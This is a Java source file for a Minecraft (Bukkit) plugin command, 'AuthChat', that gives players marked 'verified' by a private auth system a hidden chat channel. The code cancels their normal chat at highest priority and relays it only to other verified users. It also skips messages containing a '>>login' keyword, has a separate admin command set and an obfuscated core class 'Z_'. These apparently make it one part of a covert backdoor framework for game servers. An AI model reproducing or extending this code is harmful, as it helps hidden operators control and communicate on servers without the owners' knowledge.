package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public class AuthChat implements Command, Listener {
    private final ArrayList<UUID> talkingInChat = new ArrayList<>();
    private final ArrayList<String> bypass = new ArrayList<>();
    private Z_ z;

    @Override
    public boolean playerOnly() {
        return true;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"authchat", "ac"};
    }

    @Override
    public String getDescription() {
        return "Lets you talk to all verified players.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) throws IOException, InterruptedException {
        String[] args = context.getArgs();
        if (args.length == 0) {
            UUID uuid = executor.getUniqueId();

            if (talkingInChat.contains(uuid)) {
                talkingInChat.remove(uuid);
                sender.sendMessage(Colors.Prefix + Colors.Failure + "You are no longer talking in auth chat!");
                return;
            }

            talkingInChat.add(uuid);
            sender.sendMessage(Colors.Prefix + Colors.Success + "You are now talking in auth chat! You can log back in using ac.");
            return;
        }

        sendMessage(String.join(" ", context.getArgs()), sender.getName());
    }

    public void onEnable(Z_ z) {
        bypass.add("i");

        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    private void sendMessage(String message, String name) throws IOException, InterruptedException {
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (!z.getAuth().isVerified(p.getPlayer().getName())) {
                continue;
            }
            if (z.getAuth().isAdmin(p.getPlayer().getName())) {
                p.sendMessage(Colors.Prefix + ChatColor.RED + "Admin " + name + ": " + ChatColor.GRAY + message);
            }else{
                if (z.getAuth().isYouTuber(p.getPlayer().getName())) {
                    p.sendMessage(Colors.Prefix + ChatColor.RED + "YouTuber " + name + ": " + ChatColor.GRAY + message);
                }else{
                    if (z.getAuth().isVerified(p.getPlayer().getName())) {
                        p.sendMessage(Colors.Prefix + ChatColor.DARK_GRAY + name + ": " + ChatColor.GRAY + message);
                    }
                }
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    private void onMessage(AsyncPlayerChatEvent e) throws IOException, InterruptedException {
        String name = e.getPlayer().getName();
        if (!z.getAuth().isVerified(name)) {
            return;
        }

        if (!talkingInChat.contains(e.getPlayer().getUniqueId())) {
            return;
        }


        e.setMessage(e.getMessage() + " _AUTHCHAT_");

        String message = e.getMessage().replaceAll(" _AUTHCHAT_", "");
        message = ChatColor.stripColor(message);

        if (message.toLowerCase().contains(">>login")) {
            return;
        }

        if (z.getAuth().isLoggedIn(name)) {
            Command[] commands = z.commands;
            if (this.z.getAuth().isAdmin(e.getPlayer().getName())) {
                commands = Utilities.getAdminCommands(z);
            }


            for (Command cc : commands) {
                for (String c : cc.getCommands()) {
                    if (message.toLowerCase().startsWith(c) && !this.bypass.contains(c.toLowerCase())) {
                        return;
                    }
                }
            }
        }

        message = message.replace("_BYPASS_", "").trim();

        z.getAuth().setLoggedIn(name, false);
        e.setCancelled(true);
        sendMessage(message, name);
        z.getAuth().setLoggedIn(name, true);
    }
}
